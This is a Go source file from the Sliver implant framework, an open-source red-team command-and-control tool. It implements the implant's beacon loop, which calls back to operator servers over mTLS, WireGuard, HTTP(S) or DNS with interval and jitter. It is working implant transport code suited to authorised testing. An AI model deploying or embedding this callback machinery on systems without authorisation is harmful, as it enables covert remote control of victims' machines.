package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IsBeacon}}

import (
	// {{if .Config.Debug}}
	"log"

	// {{end}}

	"net/url"
	"time"

	// {{if .Config.IncludeMTLS}}
	"crypto/tls"

	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"

	// {{end}}

	// {{if .Config.IncludeHTTP}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.IncludeWG}}
	"errors"
	"net"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	"golang.zx2c4.com/wireguard/device"

	// {{end}}

	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
	"strconv"
	// {{end}}

	// {{if .Config.IncludeDNS}}

	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/util"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	_ url.URL
)

type BeaconInit func() error
type BeaconStart func() error
type BeaconRecv func() (*pb.Envelope, error)
type BeaconSend func(*pb.Envelope) error
type BeaconClose func() error
type BeaconCleanup func() error

// Beacon - Abstract connection to the server
type Beacon struct {
	Init    BeaconInit
	Start   BeaconStart
	Send    BeaconSend
	Recv    BeaconRecv
	Close   BeaconClose
	Cleanup BeaconCleanup

	ActiveC2 string
	ProxyURL string
}

// Interval - Interval between beacons
func (b *Beacon) Interval() int64 {
	return GetInterval()
}

// Jitter - Jitter between beacons
func (b *Beacon) Jitter() int64 {
	return GetJitter()
}

// Duration - Interval + random value <= Jitter
func (b *Beacon) Duration() time.Duration {
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < b.Jitter() {
		jitterDuration = time.Duration(util.Int63n(b.Jitter()))
	}
	duration := time.Duration(b.Interval()) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", duration)
	// {{end}}
	return duration
}

// StartBeaconLoop - Starts the beacon loop generator
func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
	// {{if .Config.Debug}}
	log.Printf("Starting beacon loop ...")
	// {{end}}

	var beacon *Beacon
	nextBeacon := make(chan *Beacon)

	innerAbort := make(chan struct{})
	c2Generator := C2Generator(innerAbort)

	go func() {
		defer close(nextBeacon)
		defer func() {
			innerAbort <- struct{}{}
		}()

		// {{if .Config.Debug}}
		log.Printf("Recv from c2 generator ...")
		// {{end}}
		for uri := range c2Generator {
			// {{if .Config.Debug}}
			log.Printf("Next CC = %s", uri.String())
			// {{end}}

			switch uri.Scheme {

			// *** MTLS ***
			// {{if .Config.IncludeMTLS}}
			case "mtls":
				beacon = mtlsBeacon(uri)
				// {{end}}  - IncludeMTLS
			case "wg":
				// *** WG ***
				// {{if .Config.IncludeWG}}
				beacon = wgBeacon(uri)
				// {{end}}  - IncludeWG
			case "https":
				fallthrough
			case "http":
				// *** HTTP ***
				// {{if .Config.IncludeHTTP}}
				beacon = httpBeacon(uri)
				// {{end}} - IncludeHTTP

			case "dns":
				// *** DNS ***
				// {{if .Config.IncludeDNS}}
				beacon = dnsBeacon(uri)
				// {{end}} - IncludeDNS

			default:
				// {{if .Config.Debug}}
				log.Printf("Unknown c2 protocol %s", uri.Scheme)
				// {{end}}
			}
			select {
			case nextBeacon <- beacon:
			case <-abort:
				return
			}
		}
	}()

	return nextBeacon
}

// {{if .Config.IncludeMTLS}}
func mtlsBeacon(uri *url.URL) *Beacon {
	// {{if .Config.Debug}}
	log.Printf("Beacon -> %s", uri.String())
	// {{end}}
	var err error
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}

	var conn *tls.Conn
	beacon := &Beacon{
		ActiveC2: uri.String(),
		Init: func() error {
			return nil
		},
		Start: func() error {
			conn, err = mtls.MtlsConnect(uri.Hostname(), uint16(lport))
			if err != nil {
				return err
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return mtls.ReadEnvelope(conn)
		},
		Send: func(envelope *pb.Envelope) error {
			return mtls.WriteEnvelope(conn, envelope)
		},
		Close: func() error {
			if conn != nil {
				err = conn.Close()
				if err != nil {
					return err
				}
				conn = nil
			}
			return nil
		},
		Cleanup: func() error {
			return nil
		},
	}

	return beacon
}

// {{end}}

// {{if .Config.IncludeWG}}
func wgBeacon(uri *url.URL) *Beacon {
	// {{if .Config.Debug}}
	log.Printf("Establishing Beacon -> %s", uri.String())
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 53
	}

	var conn net.Conn
	var dev *device.Device
	beacon := &Beacon{
		ActiveC2: uri.String(),
		Init: func() error {
			return nil
		},
		Start: func() error {
			addrs, err := net.LookupHost(uri.Hostname())
			if err != nil {
				return err
			}
			if len(addrs) == 0 {
				return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
			}
			hostname := addrs[0]
			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
			if err != nil {
				return err
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return wireguard.ReadEnvelope(conn)
		},
		Send: func(envelope *pb.Envelope) error {
			return wireguard.WriteEnvelope(conn, envelope)
		},
		Close: func() error {
			err = conn.Close()
			if err != nil {
				return err
			}
			err = dev.Down()
			if err != nil {
				return err
			}
			conn = nil
			dev = nil
			return nil
		},
		Cleanup: func() error {
			return nil
		},
	}
	return beacon
}

// {{end}}

// {{if .Config.IncludeHTTP}}
func httpBeacon(uri *url.URL) *Beacon {

	// {{if .Config.Debug}}
	log.Printf("Beaconing -> %s", uri)
	// {{end}}

	var client *httpclient.SliverHTTPClient
	var err error
	opts := httpclient.ParseHTTPOptions(uri)
	beacon := &Beacon{
		ActiveC2: uri.String(),
		ProxyURL: opts.ProxyConfig,
		Init: func() error {
			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[beacon] http(s) connection error %s", err)
				// {{end}}
				return err
			}
			return nil
		},
		Start: func() error {
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return client.ReadEnvelope()
		},
		Send: func(envelope *pb.Envelope) error {
			return client.WriteEnvelope(envelope)
		},
		Close: func() error {
			return nil
		},
		Cleanup: func() error {
			return client.CloseSession()
		},
	}

	return beacon
}

// {{end}}

// {{if .Config.IncludeDNS}}
func dnsBeacon(uri *url.URL) *Beacon {
	var client *dnsclient.SliverDNSClient
	var err error
	beacon := &Beacon{
		ActiveC2: uri.String(),
		Init: func() error {
			opts := dnsclient.ParseDNSOptions(uri)
			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[beacon] dns connection error %s", err)
				// {{end}}
				return err
			}
			return nil
		},
		Start: func() error {
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return client.ReadEnvelope()
		},
		Send: func(envelope *pb.Envelope) error {
			return client.WriteEnvelope(envelope)
		},
		Close: func() error {
			return nil
		},
		Cleanup: func() error {
			return client.CloseSession()
		},
	}
	return beacon
}

// {{end}} - IncludeDNS

// {{end}} - IsBeacon
